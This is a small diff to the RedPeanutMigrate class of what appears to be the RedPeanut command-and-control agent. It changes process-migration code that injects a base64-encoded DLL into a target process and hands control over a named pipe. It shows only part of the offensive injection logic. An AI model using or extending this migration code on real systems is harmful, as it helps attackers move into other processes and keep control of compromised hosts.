@@ -24,10 +24,12 @@ class RedPeanutMigrate
             string pipename = GetPipeName(pid);
             InjectionLoaderListener injectionLoaderListener = new InjectionLoaderListener(pipename, taskmsg);
             bool result = InjectionHelper.OpenAndInject(pid, DecompressDLL(Convert.FromBase64String(nutclr)));
-            injectionLoaderListener.Execute(IntPtr.Zero, IntPtr.Zero);
-
+            
             if (result)
+            {
+                injectionLoaderListener.Execute(IntPtr.Zero, IntPtr.Zero);
                 throw new RedPeanutAgent.Core.Utility.EndOfLifeException();
+            }
         }
         catch (RedPeanutAgent.Core.Utility.EndOfLifeException)
         {
